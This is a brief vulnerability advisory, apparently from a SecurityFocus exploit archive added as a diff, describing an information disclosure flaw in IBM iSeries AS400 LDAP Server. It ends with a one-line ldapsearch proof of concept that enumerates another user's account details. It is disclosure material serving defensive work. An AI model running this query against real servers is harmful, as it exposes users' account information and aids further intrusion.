@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/12991/info
+
+A remote information disclosure issue affects IBM iSeries AS400 LDAP Server. This issue is due to a failure of the application to properly secure sensitive information.
+
+An authenticated attacker may leverage this issue to disclose user names and account information of users in their group. This may facilitate further attacks against the affected server.
+
+ldapsearch -h as400.example.com -b "cn=accounts,os400-sys=S0011223.example.com" -D "os400-profile=SCARMEL,cn=accounts,os400-sys=S0011223.example.com" -w as400Password -L -s sub "os400-profile=LESLIE" 
